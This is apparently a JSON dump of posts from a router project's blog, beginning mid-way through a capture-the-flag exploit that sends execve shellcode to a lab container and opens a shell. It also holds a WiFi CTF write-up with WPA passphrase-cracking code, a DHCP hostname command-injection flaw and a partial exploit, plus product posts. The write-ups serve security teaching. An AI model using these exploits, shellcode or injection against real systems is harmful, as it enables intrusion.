OUTPUT\\")\\n    os.system(\\"iptables -A OUTPUT -p tcp --sport %d --tcp-flags RST RST -j DROP\\"%sport)\\n    conf.verb = 0\\n\\n    tcp_hs = TcpHandshake((\\"172.17.0.2\\", 31337), sport=sport)\\n\\n    r = tubes.sock.sock()\\n    r.send = tcp_hs.send_data\\n    r.recv = tcp_hs.recv\\n    tcp_hs.start()\\n\\n    tosend = b\\"\\"\\n    def nuke(offset):\\n        global tosend\\n        # scapy send is slow. to speed it up,\\n        # chunk the commands\\n        if len(tosend) > 400:\\n            r.send(tosend)\\n            tosend = b\\"\\"\\n\\n        tosend += b\'LAUNCH %d,%d\\\\n\'%(offset%0x10,offset//0x10)\\n\\n    def nukes(a, b):\\n        for i in range(a, b):\\n            nuke(i)\\n\\n\\n    nukes(0, 0x40)\\n    nukes(0x50, 0x58)\\n    nukes(0x5b, 0x60)\\n    nukes(0x70, 0xb0)\\n    nukes(0xc0, 0xc3)\\n\\n    nukes(0xc6, 0xc7)\\n    nukes(0xca, 0xd0)\\n    nuke(0xdc)\\n    nukes(0xe0, 0xec)\\n    nukes(0xed, 0xf0)\\n\\n    nukes(0x108, 0x10c)\\n    nukes(0x10d, 0x473)\\n    nukes(0x495, 0xc17)\\n    nuke(0)\\n\\n    if tosend:\\n        r.send(tosend)\\n\\n    tosend = b\'ENDTEST\\\\n\'\\n    r.send(tosend)\\n\\n    context.arch = \'amd64\'\\n    sc = b\'\\\\x90\\\\x31\\\\xc0\\\\x48\\\\xbb\\\\xd1\\\\x9d\\\\x96\\\\x91\\\\xd0\\\\x8c\\\\x97\\\\xff\\\\x48\\\\xf7\\\\xdb\\\\x53\\\\x54\\\\x5f\\\\x99\\\\x52\\\\x57\\\\x54\\\\x5e\\\\xb0\\\\x3b\\\\x0f\\\\x05\'\\n\\n    print(\\"******** sending shellcode ***********\\")\\n    d = b\'\\\\x90\' * (0xd00+200) + sc\\n\\n    tcp_hs.send_frag_data(d, 100)\\n    #raw_input()\\n\\n    r.recvuntil(b\'ENDTEST\')\\n\\n    #raw_input(\\"Ready?\\")\\n    print(\\"Waiting for data to come in...\\")\\n    time.sleep(2)\\n    tcp_hs.clear_recv()\\n    print(\\"[+] Good\\")\\n\\n    try:\\n        r.interactive()\\n    except:\\n        print(\'aborted\')\\n\\n    print(\\"over\\")\\n    raw_input()\\n    os.system(\\"iptables -F OUTPUT\\")\\n    tcp_hs.send_fin()\\n    tcp_hs.send_rst()\\n```\\n\\n```\\nFROM python:3.8-slim\\n\\n# Set the working directory\\nWORKDIR /app\\n\\n# Install system dependencies\\nRUN apt-get update && apt-get install -y libpcap-dev\\n\\n# Install Scapy using pip\\nRUN pip install scapy pwntools\\nRUN pip uninstall pyelftools -y\\nRUN pip install pyelftools==0.29\\n\\nRUN apt-get install -y iptables net-tools\\nRUN apt-get install -y tmux tcpdump iproute2\\nCOPY connect.py .\\n\\nENTRYPOINT [\\"/app/connect.py\\"]\\n```"},{"id":"virtual-spr-1click","metadata":{"permalink":"/pages/blog/virtual-spr-1click","source":"@site/blog/2023-09-10-virtual-spr-one-click.md","title":"How to use the SPR 1-click install on DigitalOcean","description":"Introduction","date":"2023-09-10T00:00:00.000Z","formattedDate":"September 10, 2023","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"Virtual","permalink":"/pages/blog/tags/virtual"},{"label":"Cloud","permalink":"/pages/blog/tags/cloud"},{"label":"VPN","permalink":"/pages/blog/tags/vpn"},{"label":"WireGuard","permalink":"/pages/blog/tags/wire-guard"},{"label":"DigitalOcean","permalink":"/pages/blog/tags/digital-ocean"}],"readingTime":2.065,"hasTruncateMarker":false,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo"}],"frontMatter":{"slug":"virtual-spr-1click","title":"How to use the SPR 1-click install on DigitalOcean","authors":"ltspo","tags":["SPR","Virtual","Cloud","VPN","WireGuard","DigitalOcean"]},"unlisted":false,"prevItem":{"title":"One Weird Trick to fix your CTF Payloads","permalink":"/pages/blog/scapy-revfrag"},"nextItem":{"title":"SPR Now Available on the iOS App Store","permalink":"/pages/blog/ios-app-released"}},"content":"## Introduction\\n\\nThis guide allows you to setup your own cloud VPN using SPR for *$4/month* on the DigitalOcean Marketplace. It features ad blocking, firewall rules,\\nand device micro-segmentation.\\n\\nIf you want to dive in directly: [Click here](https://cloud.digitalocean.com/droplets/new?app=spr&onboarding_origin=marketplace&appId=145188909&refcode=24603f3ca4bd&region=nyc1&size=s-1vcpu-512mb-10gb&type=applications&image=supernetworks-spr) to create a droplet using the SPR image. Else, follow along in the steps below.\\n\\n## Step 1 - Create a SPR Droplet\\n\\nTo create a SPR Droplet from the [Digital Ocean marketplace](https://marketplace.digitalocean.com/apps/spr), press the **Create SPR Droplet** button:\\n\\n![](/img/cloud-digital-ocean-1click-1.png)\\n\\nPressing the button will take you to the DigitalOcean control panel.\\nIf you are not logged into your DigitalOcean account, you need to login. If you don\'t have an account, you can [sign up for one](https://cloud.digitalocean.com/registrations/new).\\n\\n## Step 2 - Configure your droplet\\n\\n![](/img/cloud-digital-ocean-2.png)\\n\\nSelect a region & be sure to create a SSH key if you don\'t have one configured already.\\n\\nFor Droplet Size, the smallest *$4/month* with 512 MB RAM is enough but feel free to choose another one.\\n\\nAfter you\'ve made all your choices, press **Create droplet**.\\n\\n## Step 3 - Access your droplet\\n\\n![](/img/cloud-digital-ocean-1click-2.png)\\n\\nIn the droplet listing you can see the IP address, click **Get started** to see the tutorial and how to access you server.\\n\\n![](/img/cloud-digital-ocean-1click-3.png)\\n\\n```bash\\nssh root@165.232.129.119\\n\\n```\\n\\n## Step 4 - Generate a VPN Key and Connect\\n\\n```bash\\ncd /home/spr/super && ./virtual_install.sh\\n```\\n\\nYou can scan the QR Code generated from the terminal\\n\\n![](/img/cloud-digital-ocean-qrcode.png)\\n\\n## Step 5 -- Connecting to SPR\\n\\nTo connect to the SPR UI/API, it\'s possible to connect via the VPN, or to connect with an SSH tunnel\\n\\nFor the ssh tunnel approach, reconnect to the droplet, with forwarding options\\n```bash\\nssh root@165.22.182.180  -N -L 8000:127.0.0.1:8000\\n```\\n\\nThen navigate to localhost:8000. The password is auto generated by the droplet and presented on the first login .\\n```\\n[+] login information:\\n==========================================================\\n http tunnel: ssh 165.22.182.180 -N -L 8000:127.0.0.1:8000\\n         url: http://localhost:8000/\\n    username: admin\\n    password: SmczeGzcEPbBmQEi\\n       token: 6Yd2MtMSkm0TiDG2ZIWqoFqxgiHN9HzRJ24m/U8HKw4=\\n==========================================================\\n```\\n\\nYou can update the admin password by modifying `/home/spr/super/configs/auth/auth_users.json` directly.\\n\\nAlternately, when connected to the VPN, the default address for the SPR frontend will be at 192.168.2.1. This can be updated\\nunder the \'supernetworks\' panel.\\n\\n## Conclusion\\n\\nWith this guide we\'ve described how to setup virtual SPR to get a secure, self-hosted VPN for $4/month. The setup allows *you* to route and redirect traffic, block ads, and automate networks tasks.\\n\\nSee the [spr-virtual-image-build](https://github.com/spr-networks/spr-virtual-image-build) repository on GitHub for how the image is built.\\n\\nRead more about running SPR in the cloud in [the Virtual SPR Guide](/blog/virtual%20SPR#configure-the-vpn-client-on-your-device)."},{"id":"ios-app-released","metadata":{"permalink":"/pages/blog/ios-app-released","source":"@site/blog/2023-05-30-ios-app.md","title":"SPR Now Available on the iOS App Store","description":"Secure Private Router Configuration Made Easy","date":"2023-05-30T00:00:00.000Z","formattedDate":"May 30, 2023","tags":[{"label":"iOS","permalink":"/pages/blog/tags/i-os"},{"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"label":"VPN","permalink":"/pages/blog/tags/vpn"}],"readingTime":3.555,"hasTruncateMarker":false,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo"}],"frontMatter":{"slug":"ios-app-released","title":"SPR Now Available on the iOS App Store","authors":"ltspo","tags":["iOS","WiFi","VPN"]},"unlisted":false,"prevItem":{"title":"How to use the SPR 1-click install on DigitalOcean","permalink":"/pages/blog/virtual-spr-1click"},"nextItem":{"title":"Barely AP is Almost an Access Point","permalink":"/pages/blog/barely-ap"}},"content":"import iosHome from \'/static/img/ios-home.png\'\\nimport iosHome2 from \'/static/img/ios-home-2.png\'\\nimport iosDevice from \'/static/img/ios-device.png\'\\nimport iosDeviceAdd1 from \'/static/img/ios-device-add-1.png\'\\nimport iosDeviceAdd2 from \'/static/img/ios-device-add-2.png\'\\nimport iosDNS from \'/static/img/ios-dns.png\'\\nimport iosDNSBlock from \'/static/img/ios-dns-block.png\'\\nimport iosVPN from \'/static/img/ios-vpn.png\'\\nimport iosVPN2 from \'/static/img/ios-vpn-2.png\'\\nimport appDownload from \'/static/img/appdownload.png\'\\n\\n## Secure Private Router Configuration Made Easy\\n\\nWe are happy to announce the release of our iOS app for the SPR project. You can manage your SPR effortlessly, even while you\'re on the go with the VPN capabilities. The App is available today for $0.99. Revenue goes towards the development of SPR.\\n\\n<div style={{ display: \\"flex\\", flexDirection: \\"row\\", padding:4, gap:8, marginBottom: 20 }}>\\n\\n<a href=\\"https://apps.apple.com/us/app/secure-programmable-router/id6443709201\\">\\n<img src={appDownload} width={\\"20%\\"} />\\n</a>\\n</div>\\n\\n\\n[Read more about SPR here](/pages/docs/intro)\\n\\n### Simplified Configuration\\n\\nYou can set up your new router, configure network firewall rules, manage devices, and\\nestablish secure VPN connections with just a few taps.\\n\\n<div style={{ display: \\"flex\\", flexDirection: \\"row\\", padding:4, gap:8, marginBottom: 20 }}>\\n\\n<img src={iosHome} width={\\"50%\\"} />\\n<img src={iosHome2} width={\\"50%\\"} />\\n\\n</div>\\n\\n\\n### Connect Your Friends Quickly and Securely\\n\\nWith the SPR App you can securely bring a new device onto your wifi network in only a few seconds.\\nTo do so, add a new device, set a name, and hit next to generate a secure password.\\nThen scan the QR code from the new device and it will be good to go.\\n\\n<div style={{ display: \\"flex\\", flexDirection: \\"row\\", padding:4, gap:8, marginBottom: 20 }}>\\n\\n<img src={iosDeviceAdd1} width={\\"50%\\"} />\\n<img src={iosDeviceAdd2} width={\\"50%\\"} />\\n\\n</div>\\n\\nBy default, the new device has access to just the internet and nothing else.\\nYou can join it into groups for access to local network devices. For example,\\na gaming group for playing LAN networked games.\\n\\n\\n### Ad Blocking and DNS Controls\\n\\nEnhance your browsing experience by blocking intrusive ads at the network level. You can also view and customize your network device\'s DNS requests.\\n\\n<div style={{ display: \\"flex\\", flexDirection: \\"row\\", padding:4, gap:8, marginBottom: 20 }}>\\n\\n<img src={iosDNSBlock} width={\\"50%\\"} />\\n<img src={iosDNS} width={\\"50%\\"} />\\n\\n</div>\\n\\n### Remote Configuration via VPN\\n\\n![spr vpn client](/img/spr-infographics/spr-vpn-client.png)\\n\\nSPR works great for turning your home network into a personal VPN service. You can also host SPR in the cloud.\\nUsing SPR to VPN your mobile devices helps get better network speeds to work around operator traffic shaping, as well as keep access to media services while traveling. And it\'s also helpful to maintain ad blocking while on the go, without adding any software at all to your devices.\\n\\nWith the App you can manage your SPR over the VPN itself.\\n\\n<div style={{ display: \\"flex\\", flexDirection: \\"row\\", padding:4, gap:8, marginBottom: 20 }}>\\n\\n<img src={iosVPN} width={\\"50%\\"} />\\n<img src={iosVPN2} width={\\"50%\\"} />\\n\\n</div>\\n\\nTo learn more about running SPR using VPN, with all its features except WiFi, check out the [ Virtual SPR Setup Guide](/pages/docs/setup_guides/virtual_spr)\\n\\n\\n### Next Steps\\n\\nIf you\'d like to experience the power of open-source networking and take control of your network\'s security and privacy,\\ngive SPR a try.\\n\\nWhether you\'re connecting directly to your SPR device or remotely through a VPN, our app offers a seamless and intuitive interface, empowering you to create a hardened and resilient home network environment.\\n\\nYou can [download our iOS app](https://apps.apple.com/en/app/secure-programmable-router/id6443709201) today.\\nVisit our [homepage](https://www.supernetworks.org/) to learn more.\\n\\nThe source code for the app is [available on GitHub](https://github.com/spr-networks/super/tree/main/frontend).\\n\\n\\n**App Privacy and Privacy Policy**\\n\\n<div class=\\"app-privacy__cards\\" style={{marginBottom: \\"20px\\"}}>\\n<div class=\\"app-privacy__card\\" style={{backgroundColor: \\"#f8f8f8\\", padding: \\"28px 20px 20px 20px\\", borderRadius: \\"16px\\", textAlign:\\"center\\"}}>\\n<div class=\\"privacy-type__icon\\">\\n<svg style={{fill: \\"#0070c9\\"}} xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"32\\" height=\\"32\\" viewBox=\\"0 0 64 64\\" aria-hidden=\\"true\\"><path d=\\"M32.09 61.568c16.185 0 29.586-13.43 29.586-29.587 0-16.186-13.43-29.587-29.616-29.587-16.157 0-29.558 13.4-29.558 29.587 0 16.156 13.43 29.587 29.587 29.587zm0-4.932c-13.692 0-24.628-10.964-24.628-24.655 0-13.692 10.907-24.656 24.598-24.656 13.691 0 24.656 10.964 24.685 24.656.03 13.69-10.965 24.655-24.656 24.655zM28.897 45.76c.958 0 1.77-.464 2.35-1.363L44.504 23.54c.32-.551.696-1.219.696-1.857 0-1.276-1.16-2.117-2.378-2.117-.725 0-1.45.435-2.002 1.305l-12.038 19.29-5.714-7.368c-.696-.928-1.334-1.19-2.146-1.19-1.248 0-2.234 1.016-2.234 2.321 0 .61.261 1.247.667 1.799l7.078 8.673c.725.957 1.508 1.363 2.465 1.363z\\"></path></svg>\\n</div>\\n<h3 class=\\"privacy-type__heading\\">Data Not Collected</h3>\\n<p class=\\"privacy-type__description\\">Supernetworks, Inc. does not collect any data from this app.</p>\\n</div>\\n</div>\\n\\n\\nWe do not collect any personal information about you, such as your name, address, or email address, when you use our app.\\n\\nOur app does not use any third-party services that collect or use personal information. We may receive crash logs from Apple which include anonymized code stack traces from where the errors occured.\\n\\nWe do not share customer data with any third-party services.\\n\\n[Read our Privacy Policy here](https://www.supernetworks.org/privacy-policy.html)"},{"id":"barely-ap","metadata":{"permalink":"/pages/blog/barely-ap","source":"@site/blog/2023-05-11-barely-ap.md","title":"Barely AP is Almost an Access Point","description":"Introducing Barely AP","date":"2023-05-11T00:00:00.000Z","formattedDate":"May 11, 2023","tags":[{"label":"Python","permalink":"/pages/blog/tags/python"},{"label":"Scapy","permalink":"/pages/blog/tags/scapy"},{"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"}],"readingTime":0.675,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"barely-ap","title":"Barely AP is Almost an Access Point","authors":"ltsrad","tags":["Python","Scapy","WiFi"]},"unlisted":false,"prevItem":{"title":"SPR Now Available on the iOS App Store","permalink":"/pages/blog/ios-app-released"},"nextItem":{"title":"March 2023\'s Turtles Challenge","permalink":"/pages/blog/spr-turtles-march"}},"content":"## Introducing Barely AP\\n\\nWe\'ve [published barely an implementation of a WiFi 802.11 Access Point, using Scapy](https://github.com/spr-networks/barely-ap) to teach people about WiFi authentication.\\n\\n### What\\n\\nOn Linux, this code lets you spin up a python access point over monitor mode.  It implements features like handling probe requests, authentication, association, and reassociation, and encryption and decryption of data using CCMP (Counter Mode Cipher Block Chaining Message Authentication Code Protocol).\\n\\n### Note\\nThis code just barely gets the job done -- it should NOT be used as a reference for writing production code. It has NO protocol security, as it is not security robust despite performing authenticated CCMP encryption.\\n\\n### Usage:\\n\\n\\nBuilding & running \\n```bash\\n./build.sh\\n./setup.sh\\n```\\n\\nInspect IP traffic\\n\\n```\\n\\ndocker exec -it barely-ap tcpdump -i scapyap\\ndocker exec -it barely-sta tcpdump -i wlan1\\n```"},{"id":"spr-turtles-march","metadata":{"permalink":"/pages/blog/spr-turtles-march","source":"@site/blog/2023-05-05-turtles-march.md","title":"March 2023\'s Turtles Challenge","description":"Editor\'s note:","date":"2023-05-05T00:00:00.000Z","formattedDate":"May 5, 2023","tags":[{"label":"Turtles","permalink":"/pages/blog/tags/turtles"},{"label":"CTF","permalink":"/pages/blog/tags/ctf"},{"label":"Hacking","permalink":"/pages/blog/tags/hacking"},{"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"label":"Airocrack","permalink":"/pages/blog/tags/airocrack"},{"label":"Salsa20","permalink":"/pages/blog/tags/salsa-20"},{"label":"WPA2","permalink":"/pages/blog/tags/wpa-2"}],"readingTime":9.05,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"spr-turtles-march","title":"March 2023\'s Turtles Challenge","authors":"ltsrad","tags":["Turtles","CTF","Hacking","WiFi","Airocrack","Salsa20","WPA2"]},"unlisted":false,"prevItem":{"title":"Barely AP is Almost an Access Point","permalink":"/pages/blog/barely-ap"},"nextItem":{"title":"January 2023\'s Turtles Challenge","permalink":"/pages/blog/january-2023-turtles"}},"content":"#### Editor\'s note:\\n\\nThe Turtles WiFi challenges are a series of ctf-style problems concerning network and wifi security skills.\\n\\nThe tasks were a bit challenging, and invovled a combination of WiFi Cracking and exploring how WPA Authentication works,\\nagainst a custom Access point using Salsa20 instead of AES.\\n\\n[Axel Souchet](https://twitter.com/0vercl0k) has kindly shared his writeup with us, which we share below.\\n\\n# Turtles: Virtual WiFi Hacking Challenges - March 2023\\n\\n## Introduction\\n\\nThe older I get, the more fascinated I have become with the world surrounding me; I ask myself all the time \'how does this thing work uh \ud83e\udd14?\'. It is both fun and rewarding for me to understand the world a bit better. This is also a great way to be constantly humbled by the magic that surrounds us \ud83c\udf08\\n\\nAlthough I enjoy the process of learning how things work, there are millions of things that I interact with daily, that I know so little about; embarrassing.\\n\\nHeck, how does WiFi work I thought? Because I know that I learn best by getting my hands dirty, I decided to try to solve a few challenges as an introduction. That is why I decided to check-out the March [Turtle challenge](https://turtles.supernetworks.org/) \ud83d\ude42\\n\\nIf you want to play at home, you can find the challenges on Github and one the SPR website:\\n- https://turtles.supernetworks.org/march\\n- https://github.com/spr-networks/turtles-march-2023\\n\\nYou can participate either directly from your browser via an impressive emulated Linux environment or you can self-host the challenge by cloning the [turtles-march-2023](https://github.com/spr-networks/turtles-march-2023) repository and follow the instructions. I chose to self-host the challenges as it made it easier to debug for me.\\n\\n## Warmups\\n\\nAll right, enough blah blah and let\'s get warmed up. In that part of the challenge, we are asked to extract data off two packet captures: `turtle0.pcap` & `turtle0.5.pcap`.\\n\\nFor the first capture, we need to extract a PSK that looks like the following: `turtle{x}`, great. Because we don\'t have more details regarding the PSK\'s shape itself, it is fair to assume that the authors want us to use a wordlist attack instead of trying to bruteforce it.\\n\\nI grabbed the famous [rockyou](https://github.com/zacheller/rockyou) wordlist and I wrote a small Python script to format prepend / append `turtle{}` as this is what the PSK will look like.\\n\\n```py\\nwith open(\'rockyou-turtle.txt\', \'w\', encoding=\'utf8\') as fout:\\n    with open(\'rockyou.txt\', \'r\', encoding=\'utf8\', errors=\'replace\') as fin:\\n        for line in fin.readlines():\\n            line = line.strip()\\n            fout.write(f\'turtle{{{line}}}\\\\n\')\\nprint(\'Done\')\\n```\\n\\nThen, I ran [aircrack-ng](https://www.aircrack-ng.org/) with the new wordlist against `turtle0.pcap` with the following command: `$ aircrack-ng turtle0.pcap -w rockyou-turtle.txt`.\\n\\nAfter a few minutes, a valid key was found: `turtle{power}`, great!\\n\\n```\\n                        Aircrack-ng 1.6\\n\\n[00:00:01] 3200/2465175 keys tested (5273.73 k/s)\\n\\nTime left: 7 minutes, 46 seconds                           0.13%\\n\\n                    KEY FOUND! [ turtle{power} ]\\n\\n\\nMaster Key     : 11 8C 23 85 2D 5F 7E AC DE 8C 85 B0 CB 80 02 5F\\n                CA 48 34 DF CE 2D 2A 7C 3C 01 4B A8 14 B7 2D E1\\n\\nTransient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n                00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n\\nEAPOL HMAC     : 6B D2 F8 71 7F E5 D8 5E 5B 68 FE 53 0A 28 9D 4E\\n```\\n\\nThe next challenge says that there is data to be decrypted inside `turtle0.5.pcap`. Both the station and the AP use the [4-way handshake](https://en.wikipedia.org/wiki/IEEE_802.11i-2004) to derive various keys that are used to encrypt traffic. We cracked a PSK in the previous step, so we can  open the packet capture into [Wireshark](https://www.wireshark.org/) and let it decrypt the traffic for us. Follow Wireshark\'s [HowToDecrypt802.11](https://wiki.wireshark.org/HowToDecrypt802.11) article to know how to do that.\\n\\nOnce decrypted, there is a `PING` request with a flag in its payload: `turtle{deecoded}`, awesome.\\n\\n## Step 1\\n\\nOkay warmups done, time to have a look at the real challenges. For this step, the authors ask for us to crack another PSK from another packet capture of a handshake. We also have the [source code of a custom AP](https://github.com/spr-networks/turtles-march-2023/blob/main/t1_start/turtle1-ap-pcap.py).\\n\\nI initially threw `turtle1-handshake.pcap` at [aircrack-ng](https://www.aircrack-ng.org/) with the `rockyou-turtle.txt` wordlist but no valid key was found, bummer. I thought it was possible that this key was part of another famous wordlist so I downloaded a bunch of them, but ... same. Weird.\\n\\nI learned more about the 4-way handshake to understand how both the station & AP derive the keys needed to transmit / verify encrypted frames. Because the handshake was captured from a custom AP, it made sense to me that maybe [aircrack-ng](https://www.aircrack-ng.org/) didn\'t understand the handshake properly and missed PSK.\\n\\nI decided to implement the attack on my own. I used the MIC code that is sent by the AP in the 3rd message to verify if a candidate is valid or not (on top of the nonces/macs in the first / second messages). We have the entire EAPOL packet so we can compute the MIC code ourselves and verify if it matches the one sent by the AP. If it does, it means we have found a valid PSK \ud83e\udd24\\n\\nI ran the script against the *turtleified* rockyou wordlist, and eventually (it\'s slow!) found a valid PSK candidate: `turtle{excellent}` \ud83d\udd25\\n```python\\n# Axel \'0vercl0k\' Souchet - April 15 2023\\n# WIN w/ b\'turtle{excellent}\'\\nimport hashlib\\nimport hmac\\nfrom scapy.all import *\\n\\nclass EAPOL_KEY(Packet):\\n    name = \'EAPOL_KEY\'\\n    fields_desc = [\\n        ByteEnumField(\'key_descriptor_type\', 1, {1: \'RC4\', 2: \'RSN\'}),\\n        BitField(\'reserved2\', 0, 2),\\n        BitField(\'smk_message\', 0, 1),\\n        BitField(\'encrypted_key_data\', 0, 1),\\n        BitField(\'request\', 0, 1),\\n        BitField(\'error\', 0, 1),\\n        BitField(\'secure\', 0, 1),\\n        BitField(\'has_key_mic\', 1, 1),\\n        BitField(\'key_ack\', 0, 1),\\n        BitField(\'install\', 0, 1),\\n        BitField(\'key_index\', 0, 2),\\n        BitEnumField(\'key_type\', 0, 1, {0: \'Group/SMK\', 1: \'Pairwise\'}),\\n        BitEnumField(\'key_descriptor_type_version\', 0, 3, {\\n            1: \'HMAC-MD5+ARC4\',\\n            2: \'HMAC-SHA1-128+AES-128\',\\n            3: \'AES-128-CMAC+AES-128\',\\n            0x20: \'SALSA20-HMAC\'\\n        }),\\n        LenField(\'key_length\', None, \'H\'),\\n        LongField(\'key_replay_counter\', 0),\\n        XStrFixedLenField(\'key_nonce\', b\'\\\\x00\'*32, 32),\\n        XStrFixedLenField(\'key_iv\', b\'\\\\x00\'*16, 16),\\n        XStrFixedLenField(\'key_rsc\', b\'\\\\x00\'*8, 8),\\n        XStrFixedLenField(\'key_id\', b\'\\\\x00\'*8, 8),\\n        XStrFixedLenField(\'key_mic\', b\'\\\\x00\'*16, 16),\\n        LenField(\'wpa_key_length\', None, \'H\'),\\n        ConditionalField(\\n            XStrLenField(\'key\', b\'\\\\x00\'*16,\\n                         length_from=lambda pkt: pkt.wpa_key_length),\\n            lambda pkt: pkt.wpa_key_length and pkt.wpa_key_length > 0)\\n    ]\\n\\n\\ndef customPRF512(key, amac, smac, anonce, snonce):\\n    \\"\\"\\"Source https://stackoverflow.com/questions/12018920/\\"\\"\\"\\n    A = b\\"Pairwise key expansion\\"\\n    B = b\\"\\".join(sorted([amac, smac]) + sorted([anonce, snonce]))\\n    num_bytes = 64\\n    R = b\'\'\\n    for i in range((num_bytes * 8 + 159) // 160):\\n        R += hmac.new(key, A + chb(0x00) + B + chb(i), hashlib.sha1).digest()\\n    return R[:num_bytes]\\n\\ndef calc(pwd):\\n    amac = bytes.fromhex(\'02:00:00:00:00:00\'.replace(\':\', \'\'))\\n    smac = bytes.fromhex(\'02:00:00:00:01:00\'.replace(\':\', \'\'))\\n    anonce = bytes.fromhex(\\n        \'7338c25bf9d1bba6a8dea56e87bb8b6a2e3f658be7ba8173c6ab58991e648e5f\')\\n    snonce = bytes.fromhex(\\n        \'82ce083ab0cdb46f1ae0cc94a922cdf7ca742bf130396996f92be706cca62a25\')\\n    PMK = hashlib.pbkdf2_hmac(\'sha1\', pwd, b\'turtle1\', 4_096, 32)\\n    KCK = customPRF512(PMK, amac, smac, anonce, snonce)[:16]\\n    keydata = bytes.fromhex(\'ace914ed4b7bf2b638b81c841bd3ab67561681d57591496ff93465d173c04f911679a118fb7f9590faef7fe21aa5c82d8bc746b190ea84e1\')\\n    assert len(keydata) == 56\\n    ek = EAPOL(version=\'802.1X-2004\',type=\'EAPOL-Key\') / EAPOL_KEY(\\n        key_descriptor_type=2, key_descriptor_type_version=2, install=1, key_type=1, key_ack=1,\\\\\\n        has_key_mic=1, secure=1, encrypted_key_data=1, key_replay_counter=2, \\\\\\n        key_nonce=anonce, key_length=16, key=keydata, wpa_key_length=len(keydata)\\n    )\\n    return hmac.new(KCK, ek.build(), hashlib.sha1).digest()[:16]\\n\\ndef main():\\n    wanted = bytes.fromhex(\'7235448e1b056108e40ff429ad3545ab\')\\n    assert len(wanted) == 16\\n    with open(\'rockyou-turtle.txt\', \'r\', encoding=\'utf8\') as fin:\\n        for line in fin.readlines():\\n            candidate = line.strip().encode()\\n            c = calc(candidate)\\n            assert len(c) == 16\\n            if c == wanted:\\n                print(f\'WIN w/ {candidate}\')\\n                return\\n    print(\'Done\')\\n\\nif __name__ == \'__main__\':\\n    main()\\n```\\n\\n## Step 2\\n\\nAll right, final step. In this step, we are given another custom [AP\'s source code](https://github.com/spr-networks/turtles-march-2023/blob/main/t1_ap/turtleap/go.py) and we need to break in. How exciting uh?\\n\\nFor this step, I set-up an environment to debug and interact with the AP. I created a regular Hyper-V Ubuntu VM (note that this won\'t work from WSL2) and ran the two containers with the below commands:\\n\\n```text\\nover@bubuntu:~/turtles-march-2023$ sudo docker compose up -d\\n[sudo] password for over:\\nStarting t1_ap    ... done\\nStarting t1_start ... done\\n\\nover@bubuntu:~/turtles-march-2023$ sudo ./setup.sh\\n```\\n\\nAt that stage, you can log-in into both containers with the following commands:\\n\\n```text\\nover@bubuntu:~/turtles-march-2023$ sudo docker exec -it t1_start bash\\nover@bubuntu:~/turtles-march-2023$ sudo docker exec -it t1_ap bash\\n```\\n\\n`t1_ap` is the container that runs the AP and `t1_start` is where you can run a client and send packets to the AP. This is cool because you don\'t need any physical Wifi device to play in this environment!\\n\\nOne of the keys that is derived during the 4-way handshake is meant to be shared by every station; kind of a group key. My understanding is that it is used to send broadcast-like packets to every station. In the AP, it turns out this key is a constant: `turtle{everyone gets a shell :)}` \ud83d\ude2c\\n\\nAfter reading the code carefully, it is clear that there you don\'t need to be associated with the AP to send a packet encrypted with this group key. This is particularly interesting because we don\'t have knowledge of the PSK which means we wouldn\'t be able to complete the 4-way handshake. In a normal AP, the `GTK` is shared in an encrypted frame and it isn\'t a constant / isn\'t known by an attacker (and is rotated every time a station disconnects).\\n\\nFinally, an attacker can trigger a shell command injection when the AP parses a DHCP offer packet:\\n```py\\ndef reply_dhcp_offer(self, incoming):\\n    # ...\\n    for o in incoming[DHCP].options:\\n        # Log hostname for DNS revers lookup\\n        if o[0] == \'hostname\':\\n            cmd = \\"echo %s %s.lan >> hostnames.txt\\" % (dest_ip, o[1].decode(\\"ascii\\"))\\n            os.system(cmd )\\n```\\n\\nAt this point we have every ingredients to break into the AP and execute arbitrary shell commands by sending a specially crafted DHCP offer packet  encrypted with the GTK \ud83d\udd25; here\'s my code that can be run from `t1_start`:\\n```py\\n# Axel \'0vercl0k\' Souchet - April 11 2023\\nfrom scapy.all import *\\nfrom salsa20 import Salsa20\\nfrom itertools import count\\nimport hmac\\nimport hashlib\\nimport struct\\n\\ngtk_full = b\'turtle{everyone gets a shell :)}\'\\nGTK = gtk_full[:16]\\nMIC_AP_TO_GROUP = gtk_full[16:24]\\ngroup_IV = count()\\n\\ndef encrypt(pkt):\\n  data = pkt.build()\\n  pn = next(group_IV)\\n  aad_calc = hmac.new(MIC_AP_TO_GROUP, data, hashlib.sha1).digest()[:16]\\n  key = GTK\\n  cipher = Salsa20(key, struct.pack(\'>Q\', pn))\\n  payload = cipher.encrypt(data) + aad_calc\\n  pn0 = pn & 0xff\\n  pn1 = (pn>>8) & 0xff\\n  pn2 = (pn>>16) & 0xff\\n  pn3 = (pn>>24) & 0xff\\n  return Dot11CCMP(data=payload, ext_iv=1, key_id=1, PN0 = pn0, PN1=pn1, PN2=pn2, PN3=pn3)\\n\\ndef main():\\n    # root@0c0b905e70eb:/# iw dev\\n    # phy#0\\n    #   Interface mon0\\n    #     ifindex 2\\n    #     wdev 0x2\\n    #     addr 02:00:00:00:00:00\\n    #     type monitor\\n    #     txpower 20.00 dBm\\n    #   Interface wlan0\\n    #     ifindex 50\\n    #     wdev 0x1\\n    #     addr 02:00:00:00:00:00\\n    #     type managed\\n    #     txpower 20.00 dBm\\n    ap = \'02:00:00:00:00:00\'\\n    # root@29a50eeb6fb5:/x# iw dev\\n    # phy#1\\n    #   Interface wlan1\\n    #     ifindex 51\\n    #     wdev 0x100000001\\n    #     addr 02:00:00:00:01:00\\n    #     type managed\\n    #     txpower 20.00 dBm\\n    station = \'02:00:00:00:01:00\'\\n    cmd = \'id; ls /\'\\n    inner_pkt = 